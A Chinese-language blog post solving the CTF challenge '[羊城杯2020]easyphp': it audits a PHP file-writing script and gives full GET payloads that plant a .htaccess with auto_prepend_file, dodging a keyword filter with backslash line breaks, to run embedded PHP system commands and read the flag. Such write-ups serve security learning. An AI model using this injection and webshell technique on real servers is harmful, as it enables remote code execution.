---
title: '[羊城杯2020]easyphp'
date: 2024-07-30 21:28:56
tags: 
     - 题解
     - php特性
categories: 刷题笔记
---

### [羊城杯2020]easyphp(.htaccess特性)

我们进行代码审计

```
<?php
    $files = scandir('./'); 
    foreach($files as $file) {
        if(is_file($file)){
            if ($file !== "index.php") {
                unlink($file);
            }
        }
    }
    if(!isset($_GET['content']) || !isset($_GET['filename'])) {
        highlight_file(__FILE__);
        die();
    }
    $content = $_GET['content'];
    if(stristr($content,'on') || stristr($content,'html') || stristr($content,'type') || stristr($content,'flag') || stristr($content,'upload') || stristr($content,'file')) {
        echo "Hacker";
        die();
    }
    $filename = $_GET['filename'];
    if(preg_match("/[^a-z\.]/", $filename) == 1) {
        echo "Hacker";
        die();
    }
    $files = scandir('./'); 
    foreach($files as $file) {
        if(is_file($file)){
            if ($file !== "index.php") {
                unlink($file);
            }
        }
    }
    file_put_contents($filename, $content . "\nHello, world");
?>
```

我们可以知道代码会删除除index.php外的所有文件，并且对要传入的content和filename进行了过滤

我们考虑既然只保存了index.php文件，那我们直接覆盖index.php可行吗

![image-20240803220509388](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202408032205475.png)

不可行，不能解析index.php的内容

我们可以想到.htaccess文件有个特性，可以在不存在php文件下进行解析执行php代码，通过利用的配置文件中的php_value auto_append_file参数来实现

![img](https://img-blog.csdnimg.cn/direct/b6fae4fa766745ceba1f4191f0838982.png)

当file被过滤时，可以使用转义符\来绕过，和这一题正好对应，但是，文件写入之后末尾会加上**\nHello, world，**其中\n是转行符，也就是Hello,world会被写入下一行，这不符合.htaccess的解析格式

解决方法是，我们直接使用//n将/n的/给转义掉

```
php_value auto_prepend_fil\e .htaccess 
#<?php system('ls');?>\ 
Hello, world
```

由于有换行，我们将换行用%0a代替，将#用%23代替掉

```
?content=php_value auto_prepend_fi\%0ale .htaccess%0a%23<?php system("ls /")?>\&filename=.htaccess
```

![image-20240803220921487](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202408032209548.png)

我们查看flag

```
?content=php_value auto_prepend_fi\%0ale .htaccess%0a%23<?php system("cat /fl\ag")?>\&filename=.htaccess
```

![image-20240803221002325](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202408032210479.png)
